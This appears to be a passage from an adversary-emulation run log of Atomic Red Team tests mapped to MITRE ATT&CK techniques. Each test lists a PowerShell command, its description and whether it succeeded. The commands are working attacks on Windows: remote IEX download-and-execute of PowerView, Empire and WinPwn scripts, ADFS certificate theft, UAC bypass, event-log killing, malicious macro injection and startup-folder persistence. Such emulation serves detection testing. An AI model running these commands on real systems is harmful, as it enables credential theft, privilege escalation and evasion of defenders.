            'technique_name': 'System Owner/User Discovery'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
            '-UseBasicParsing); Invoke-UserHunter -Stealth -Verbose',
 'delegated': '2023-11-27T14:49:02Z',
 'description': 'Find existing user session on other computers. Upon '
                'execution, information about any sessions discovered will be '
                'displayed.',
 'executor': 'psh',
 'link_id': 'a07dfabd-eb9f-4520-af38-d65fbd5837f0',
 'name': 'Find computers where user has session - Stealth mode (PowerView)',
 'pid': 1576,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Invoke-UserHunter -Stealth -Verbose',
 'platform': 'windows',
 'run': '2023-11-27T14:49:37Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1552_004__credential-access__unsecured_credentials-_private_keys__2d78dfbfea7fa4ec7349993b83048079__trial_1

atomic_ordering: ['2d78dfbfea7fa4ec7349993b83048079']
------------------------------
{'ability_id': '2d78dfbfea7fa4ec7349993b83048079',
 'agent_reported_time': '2023-11-11T13:10:08Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1552.004',
            'technique_name': 'Unsecured Credentials: Private Keys'},
 'command': 'Import-Module AADInternals -Force; Export-AADIntADFSCertificates; '
            'Get-ChildItem | Where-Object {$_ -like "ADFS*"}; Write-Host '
            '"`nCertificates retrieved successfully"',
 'delegated': '2023-12-02T16:43:41Z',
 'description': 'Retrieve ADFS token signing and encrypting certificates. This '
                'is a precursor to the Golden SAML attack (T1606.002). You '
                'must be signed in as Administrator on an ADFS server.\n'
                'Based on https://o365blog.com/post/adfs/ and '
                'https://github.com/fireeye/ADFSDump.\n',
 'executor': 'psh',
 'link_id': 'f01c8385-8abf-41e2-b716-b7958a5f78d2',
 'name': 'ADFS token signing and encryption certificates theft - Local',
 'pid': 4084,
 'plaintext_command': 'Import-Module AADInternals -Force; '
                      'Export-AADIntADFSCertificates; Get-ChildItem | '
                      'Where-Object {$_ -like "ADFS*"}; Write-Host '
                      '"`nCertificates retrieved successfully"',
 'platform': 'windows',
 'run': '2023-12-02T16:44:20Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1204_002__execution__user_execution-_malicious_file__cde814c61dcd8b0fbeeb14f005c2432f__trial_1

atomic_ordering: ['cde814c61dcd8b0fbeeb14f005c2432f']
------------------------------
{'ability_id': 'cde814c61dcd8b0fbeeb14f005c2432f',
 'agent_reported_time': '2023-11-11T13:10:05Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1204.002',
            'technique_name': 'User Execution: Malicious File'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing); $macrocode = "   Open '
            '`"C:\\Users\\Public\\art.jse`" For Output As #1`n   Write #1, '
            '`"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c '
            'wscript.exe //E:jscript C:\\Users\\Public\\art.jse`", '
            'vbNormalFocus)`n"; Invoke-MalDoc -macroCode $macrocode '
            '-officeProduct "Word"',
 'delegated': '2023-11-30T16:37:03Z',
 'description': 'Malicious JavaScript executing CMD which spawns wscript.exe '
                '//e:jscript\n'
                'Execution is handled by '
                '[Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) '
                'to load and execute VBA code into Excel or Word documents.\n',
 'executor': 'psh',
 'link_id': 'de90b33a-bf53-420b-9232-6bb5192a47c5',
 'name': 'OSTAP JS version',
 'pid': 9200,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing); $macrocode = "   Open '
                      '`"C:\\Users\\Public\\art.jse`" For Output As #1`n   '
                      'Write #1, `"WScript.Quit`"`n   Close #1`n   a = '
                      'Shell(`"cmd.exe /c wscript.exe //E:jscript '
                      'C:\\Users\\Public\\art.jse`", vbNormalFocus)`n"; '
                      'Invoke-MalDoc -macroCode $macrocode -officeProduct '
                      '"Word"',
 'platform': 'windows',
 'run': '2023-11-30T16:37:33Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1046__discovery__network_service_discovery__65e9fb2b4c023de2a2a73de5cc58ce7f__trial_1

atomic_ordering: ['65e9fb2b4c023de2a2a73de5cc58ce7f']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_001__defense-evasion__signed_binary_proxy_execution-_compiled_html_file__5b1aea789aa50c07bb5555dcff5d42a6__trial_1

atomic_ordering: ['5b1aea789aa50c07bb5555dcff5d42a6']
------------------------------
{'ability_id': '5b1aea789aa50c07bb5555dcff5d42a6',
 'agent_reported_time': '2023-11-11T13:09:52Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.001',
            'technique_name': 'Signed Binary Proxy Execution: Compiled HTML '
                              'File'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath '
            '$env:windir\\hh.exe -CHMFilePath Test.chm',
 'delegated': '2023-11-30T18:53:39Z',
 'description': 'Executes a CHM file with the ITS protocol handler.',
 'executor': 'psh',
 'link_id': '16921744-34ff-44f2-8b6f-34df7aaf5b76',
 'name': 'Invoke CHM with InfoTech Storage Protocol Handler',
 'pid': 11120,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Invoke-ATHCompiledHelp '
                      '-InfoTechStorageHandler its -HHFilePath '
                      '$env:windir\\hh.exe -CHMFilePath Test.chm',
 'platform': 'windows',
 'run': '2023-11-30T18:54:24Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1110_001__credential-access__brute_force-_password_guessing__3883fdbd7c29b2f2f20121c75f875944__trial_1

atomic_ordering: ['3883fdbd7c29b2f2f20121c75f875944']
==============================
==============================
adversary_id: atomic__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__ae73a53476995f46b71f11709f525319__trial_1

atomic_ordering: ['ae73a53476995f46b71f11709f525319']
------------------------------
{'ability_id': 'ae73a53476995f46b71f11709f525319',
 'agent_reported_time': '2023-11-11T13:09:29Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1134.001',
            'technique_name': 'Access Token Manipulation: Token '
                              'Impersonation/Theft'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' "
            '-UseBasicParsing); Get-System -Technique Token -Verbose',
 'delegated': '2023-11-30T06:38:24Z',
 'description': "Uses PowerShell and Empire's [GetSystem "
                'module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). '
                'The script uses `SeDebugPrivilege` to obtain, duplicate and '
                'impersonate the token of a another process.\n'
                'When executed successfully, the test displays the domain and '
                "name of the account it's impersonating (local SYSTEM).",
 'executor': 'psh',
 'link_id': 'db903880-0029-4cb2-840d-4a0ab30f363d',
 'name': '`SeDebugPrivilege` token duplication',
 'pid': 6860,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' "
                      '-UseBasicParsing); Get-System -Technique Token -Verbose',
 'platform': 'windows',
 'run': '2023-11-30T06:38:59Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__d5bb3cda05ddba230c90c1afb2640379__trial_1

atomic_ordering: ['d5bb3cda05ddba230c90c1afb2640379']
------------------------------
{'ability_id': 'd5bb3cda05ddba230c90c1afb2640379',
 'agent_reported_time': '2023-11-11T13:10:21Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'inv-phantom -consoleoutput -noninteractive',
 'delegated': '2023-12-03T13:45:56Z',
 'description': 'Kill the event log services for stealth via function of '
                'WinPwn',
 'executor': 'psh',
 'link_id': '226823e1-652f-4d4f-a70a-fdb49307960d',
 'name': 'WinPwn - Kill the event log services for stealth',
 'pid': 10924,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'inv-phantom -consoleoutput -noninteractive',
 'platform': 'windows',
 'run': '2023-12-03T13:46:40Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__b473176c321f31824c909c73807caf92__trial_1

atomic_ordering: ['b473176c321f31824c909c73807caf92']
------------------------------
{'ability_id': 'b473176c321f31824c909c73807caf92',
 'agent_reported_time': '2023-11-11T13:10:34Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1548.002',
            'technique_name': 'Abuse Elevation Control Mechanism: Bypass User '
                              'Account Control'},
 'command': 'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')",
 'delegated': '2023-12-02T11:32:37Z',
 'description': 'UAC Bypass DccwBypassUAC technique via function of WinPwn',
 'executor': 'psh',
 'link_id': '1d47a56a-9a66-4fcf-a7e6-b4966ae841d7',
 'name': 'WinPwn - UAC Bypass DccwBypassUAC technique',
 'pid': 10176,
 'plaintext_command': 'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')",
 'platform': 'windows',
 'run': '2023-12-02T11:33:30Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1615__discovery__group_policy_discovery__834e861bba95b87d066e84c5c6b056a0__trial_1

atomic_ordering: ['834e861bba95b87d066e84c5c6b056a0']
------------------------------
{'ability_id': '834e861bba95b87d066e84c5c6b056a0',
 'agent_reported_time': '2023-11-11T13:11:07Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1615',
            'technique_name': 'Group Policy Discovery'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'GPORemoteAccessPolicy -consoleoutput -noninteractive',
 'delegated': '2023-12-04T04:21:11Z',
 'description': 'Enumerate remote access policies through group policy using '
                'GPORemoteAccessPolicy function of WinPwn',
 'executor': 'psh',
 'link_id': 'de258801-dba6-43c0-8061-315885e5927e',
 'name': 'WinPwn - GPORemoteAccessPolicy',
 'pid': 10924,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'GPORemoteAccessPolicy -consoleoutput -noninteractive',
 'platform': 'windows',
 'run': '2023-12-04T04:21:53Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1105__command-and-control__ingress_tool_transfer__b0e28215c59037cc6cdb61b38615c32d__trial_1

atomic_ordering: ['b0e28215c59037cc6cdb61b38615c32d']
------------------------------
{'ability_id': 'b0e28215c59037cc6cdb61b38615c32d',
 'agent_reported_time': '2023-11-11T13:10:15Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1105',
            'technique_name': 'Ingress Tool Transfer'},
 'command': '(New-Object '
            "Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') "
            '| Out-File LICENSE.txt; Invoke-Item LICENSE.txt',
 'delegated': '2023-11-29T18:25:20Z',
 'description': 'Use PowerShell to download and write an arbitrary file from '
                'the internet. Example is from the 2021 Threat Detection '
                'Report by Red Canary.\n',
 'executor': 'psh',
 'link_id': 'aec64853-1001-4447-b932-bcc741ef8d90',
 'name': 'File Download via PowerShell',
 'pid': 2456,
 'plaintext_command': '(New-Object '
                      "Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') "
                      '| Out-File LICENSE.txt; Invoke-Item LICENSE.txt',
 'platform': 'windows',
 'run': '2023-11-29T18:25:52Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1033__discovery__system_owner,user_discovery__725f6e03f3e2098c4303861566f18894__trial_1

atomic_ordering: ['725f6e03f3e2098c4303861566f18894']
------------------------------
{'ability_id': '725f6e03f3e2098c4303861566f18894',
 'agent_reported_time': '2023-11-11T13:10:25Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1033',
            'technique_name': 'System Owner/User Discovery'},
 'command': "$TokenSet = @{;   U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ';   N = "
            "[Char[]]'0123456789'; }; $Upper = Get-Random -Count 5 "
            '-InputObject $TokenSet.U; $Number = Get-Random -Count 5 '
            '-InputObject $TokenSet.N; $StringSet = $Upper + $Number; $rad = '
            "(Get-Random -Count 5 -InputObject $StringSet) -join ''; $file = "
            '"rad" + $rad + ".tmp"; whoami.exe /all >> $env:temp\\$file',
 'delegated': '2023-11-27T14:29:41Z',
 'description': 'SocGholish performs whoami discovery commands and outputs the '
                'results to a tmp file. \n'
                'The test will generate a filename similar to the random one '
                'generated during execution and write the file to '
                'AppData\\Temp.\n'
                '\n'
                'Reference: '
                'https://redcanary.com/threat-detection-report/threats/socgholish/\n',
 'executor': 'psh',
 'link_id': '6031c95e-b15f-4a96-8367-8cd85fb3733c',
 'name': 'System Discovery - SocGholish whoami',
 'pid': 2184,
 'plaintext_command': '$TokenSet = @{;   U = '
                      "[Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ';   N = "
                      "[Char[]]'0123456789'; }; $Upper = Get-Random -Count 5 "
                      '-InputObject $TokenSet.U; $Number = Get-Random -Count 5 '
                      '-InputObject $TokenSet.N; $StringSet = $Upper + '
                      '$Number; $rad = (Get-Random -Count 5 -InputObject '
                      '$StringSet) -join \'\'; $file = "rad" + $rad + ".tmp"; '
                      'whoami.exe /all >> $env:temp\\$file',
 'platform': 'windows',
 'run': '2023-11-27T14:30:30Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1566_001__initial-access__phishing-_spearphishing_attachment__1afaec09315ab71fdfb167175e8a019a__trial_1

atomic_ordering: ['1afaec09315ab71fdfb167175e8a019a']
------------------------------
{'ability_id': '1afaec09315ab71fdfb167175e8a019a',
 'agent_reported_time': '2023-11-11T13:10:24Z',
 'attack': {'tactic': 'initial-access',
            'technique_id': 'T1566.001',
            'technique_name': 'Phishing: Spearphishing Attachment'},
 'command': '$url = '
            "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; "
            '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url '
            '-OutFile $env:TEMP\\PhishingAttachment.xlsm',
 'delegated': '2023-12-03T21:30:41Z',
 'description': 'This atomic test downloads a macro enabled document from the '
                'Atomic Red Team GitHub repository, simulating an end user '
                'clicking a phishing link to download the file.\n'
                'The file "PhishingAttachment.xlsm" is downloaded to the '
                '%temp% directory.\n',
 'executor': 'psh',
 'link_id': '690bf01b-4565-4fa0-9996-06ce8b6d45e8',
 'name': 'Download Macro-Enabled Phishing Attachment',
 'pid': 10636,
 'plaintext_command': '$url = '
                      "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; "
                      '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest '
                      '-Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm',
 'platform': 'windows',
 'run': '2023-12-03T21:31:16Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1036__defense-evasion__masquerading__7575d3d5ae97ee568d49afbd0f878fe2__trial_1

atomic_ordering: ['7575d3d5ae97ee568d49afbd0f878fe2']
------------------------------
{'ability_id': '7575d3d5ae97ee568d49afbd0f878fe2',
 'agent_reported_time': '2023-11-11T13:10:29Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1036',
            'technique_name': 'Masquerading'},
 'command': 'if (Test-Path '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip") { ; } '
            'else {New-Item -Type Directory '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\" -ErrorAction ignore '
            '-Force | Out-Null; Invoke-WebRequest '
            'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip '
            '-OutFile '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip"};  ;  '
            'Expand-Archive -Path '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip" '
            '-DestinationPath "$env:userprofile\\Downloads\\T1036" -Force; cd '
            '"$env:userprofile\\Downloads\\T1036"; cmd /c '
            '"$env:userprofile\\Downloads\\T1036\\README.cmd" >$null 2>$null',
 'delegated': '2023-11-27T16:08:31Z',
 'description': 'When the file is unzipped and the README.cmd file opened, it '
                'executes and changes the .pdf to .dll and executes the dll. '
                'This is a BazaLoader technique [as reported '
                'here](https://twitter.com/ffforward/status/1481672378639912960)',
 'executor': 'psh',
 'link_id': '328cb3dd-5d53-40d8-82a1-8d699837971b',
 'name': 'Malware Masquerading and Execution from Zip File',
 'pid': 8788,
 'plaintext_command': 'if (Test-Path '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip") '
                      '{ ; } else {New-Item -Type Directory '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\" '
                      '-ErrorAction ignore -Force | Out-Null; '
                      'Invoke-WebRequest '
                      'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip '
                      '-OutFile '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip"};  '
                      ';  Expand-Archive -Path '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip" '
                      '-DestinationPath "$env:userprofile\\Downloads\\T1036" '
                      '-Force; cd "$env:userprofile\\Downloads\\T1036"; cmd /c '
                      '"$env:userprofile\\Downloads\\T1036\\README.cmd" >$null '
                      '2>$null',
 'platform': 'windows',
 'run': '2023-11-27T16:08:54Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1021_006__lateral-movement__remote_services-_windows_remote_management__e643e21318c069d0a576da91650c76fe__trial_1

atomic_ordering: ['e643e21318c069d0a576da91650c76fe']
------------------------------
{'ability_id': 'e643e21318c069d0a576da91650c76fe',
 'agent_reported_time': '2023-11-11T13:10:14Z',
 'attack': {'tactic': 'lateral-movement',
            'technique_id': 'T1021.006',
            'technique_name': 'Remote Services: Windows Remote Management'},
 'command': 'Enable-PSRemoting -Force',
 'delegated': '2023-11-27T10:58:26Z',
 'description': 'Powershell Enable WinRM\n'
                '\n'
                'Upon successful execution, powershell will '
                '"Enable-PSRemoting" allowing for remote PS access.\n',
 'executor': 'psh',
 'link_id': '59db9808-f040-4dbe-b451-7e4bb422b456',
 'name': 'Enable Windows Remote Management',
 'pid': 188,
 'plaintext_command': 'Enable-PSRemoting -Force',
 'platform': 'windows',
 'run': '2023-11-27T10:59:15Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__c736f0cee0c30c06095fedc05fa83912__trial_1

atomic_ordering: ['c736f0cee0c30c06095fedc05fa83912']
==============================
==============================
adversary_id: atomic__t1133__multiple__external_remote_services__ff4e1ea516f781a6ef93323ba9dfac0a__trial_1

atomic_ordering: ['ff4e1ea516f781a6ef93323ba9dfac0a']
------------------------------
{'ability_id': 'ff4e1ea516f781a6ef93323ba9dfac0a',
 'agent_reported_time': '2023-11-11T13:10:03Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1133',
            'technique_name': 'External Remote Services'},
 'command': '$extList = "fcfhplploccackoneaefokcmbjfbkenj", '
            '"fdcgdnkidjaadafnichfpabhfomcebme"; foreach ($extension in '
            '$extList) {;   New-Item -Path '
            'HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension '
            '-Force;   New-ItemProperty -Path '
            '"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension" '
            '-Name "update_url" -Value '
            '"https://clients2.google.com/service/update2/crx" -PropertyType '
            '"String" -Force}; Start chrome; Start-Sleep -Seconds 30; '
            'Stop-Process -Name "chrome"',
 'delegated': '2023-11-30T05:42:43Z',
 'description': 'Running Chrome VPN Extensions via the Registry install 2 vpn '
                'extension, please see "T1133\\src\\list of vpn extension.txt" '
                'to view complete list\n',
 'executor': 'psh',
 'link_id': '7159e1a2-f3c2-4128-bca4-dba96c527282',
 'name': 'Running Chrome VPN Extensions via the Registry 2 vpn extension',
 'pid': 9228,
 'plaintext_command': '$extList = "fcfhplploccackoneaefokcmbjfbkenj", '
                      '"fdcgdnkidjaadafnichfpabhfomcebme"; foreach ($extension '
                      'in $extList) {;   New-Item -Path '
                      'HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension '
                      '-Force;   New-ItemProperty -Path '
                      '"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension" '
                      '-Name "update_url" -Value '
                      '"https://clients2.google.com/service/update2/crx" '
                      '-PropertyType "String" -Force}; Start chrome; '
                      'Start-Sleep -Seconds 30; Stop-Process -Name "chrome"',
 'platform': 'windows',
 'run': '2023-11-30T05:43:29Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1082__discovery__system_information_discovery__009e7a7118b5a182b2a5b65150e5cc6f__trial_1

atomic_ordering: ['009e7a7118b5a182b2a5b65150e5cc6f']
------------------------------
{'ability_id': '009e7a7118b5a182b2a5b65150e5cc6f',
 'agent_reported_time': '2023-11-11T13:10:02Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1082',
            'technique_name': 'System Information Discovery'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'oldchecks -noninteractive -consoleoutput',
 'delegated': '2023-11-29T00:23:04Z',
 'description': 'Powersploits privesc checks using oldchecks function of '
                'WinPwn',
 'executor': 'psh',
 'link_id': '3cff8326-d1a6-41f3-b978-5476c78b8626',
 'name': 'WinPwn - Powersploits privesc checks',
 'pid': 9640,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'oldchecks -noninteractive -consoleoutput',
 'platform': 'windows',
 'run': '2023-11-29T00:24:02Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1552_005__credential-access__unsecured_credentials-_cloud_instance_metadata_api__315440f0fd42ea0129065a76d89184f1__trial_1

atomic_ordering: ['315440f0fd42ea0129065a76d89184f1']
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__55e14d8b479b905a13976c8d94016a7b__trial_1

atomic_ordering: ['55e14d8b479b905a13976c8d94016a7b']
==============================
==============================
adversary_id: atomic__t1482__discovery__domain_trust_discovery__53571e9988b92014f9d71888936d3878__trial_1

atomic_ordering: ['53571e9988b92014f9d71888936d3878']
------------------------------
{'ability_id': '53571e9988b92014f9d71888936d3878',
 'agent_reported_time': '2023-11-11T13:10:28Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1482',
            'technique_name': 'Domain Trust Discovery'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
            '-UseBasicParsing); Get-DomainTrust -Verbose',
 'delegated': '2023-12-01T07:48:43Z',
 'description': 'Utilizing PowerView, run Get-DomainTrust to identify domain '
                'trusts. Upon execution, progress and info about trusts within '
                'the domain being scanned will be displayed.\n',
 'executor': 'psh',
 'link_id': 'c021f21d-143a-4b73-be4f-6866901997ec',
 'name': 'Get-DomainTrust with PowerView',
 'pid': 3792,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Get-DomainTrust -Verbose',
 'platform': 'windows',
 'run': '2023-12-01T07:49:56Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__fef50b36806647cb5a5511ae48f7e56f__trial_1

atomic_ordering: ['fef50b36806647cb5a5511ae48f7e56f']
------------------------------
{'ability_id': 'fef50b36806647cb5a5511ae48f7e56f',
 'agent_reported_time': '2023-11-11T13:09:17Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.001',
            'technique_name': 'Boot or Logon Autostart Execution: Registry Run '
                              'Keys / Startup Folder'},
 'command': 'Copy-Item "$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse" '
            '"$env:APPDATA\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\Startup\\jsestartup.jse"; Copy-Item '
            '"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse" '
            '"C:\\ProgramData\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\StartUp\\jsestartup.jse"; cscript.exe /E:Jscript '
            '"$env:APPDATA\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\Startup\\jsestartup.jse"; cscript.exe /E:Jscript '
            '"C:\\ProgramData\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\StartUp\\jsestartup.jse"',
 'delegated': '2023-12-02T03:44:34Z',
 'description': 'jse files can be placed in and ran from the startup folder to '
                'maintain persistance.\n'
                'Upon execution, "T1547.001 Hello, World JSE!" will be '
                'displayed twice. \n'
                'Additionally, the new files can be viewed in the '
                '"$env:APPDATA\\Microsoft\\Windows\\Start '
                'Menu\\Programs\\Startup"\n'
                'folder and will also run when the computer is restarted and '
                'the user logs in.\n',
 'executor': 'psh',
 'link_id': '6274eee7-29ad-44e6-90cc-2e6ae9a2328b',
 'name': 'Suspicious jse file run from startup Folder',
 'pid': 3568,
 'plaintext_command': 'Copy-Item '
                      '"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse" '
                      '"$env:APPDATA\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\Startup\\jsestartup.jse"; Copy-Item '
                      '"$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse" '
                      '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\StartUp\\jsestartup.jse"; cscript.exe '
                      '/E:Jscript "$env:APPDATA\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\Startup\\jsestartup.jse"; cscript.exe '
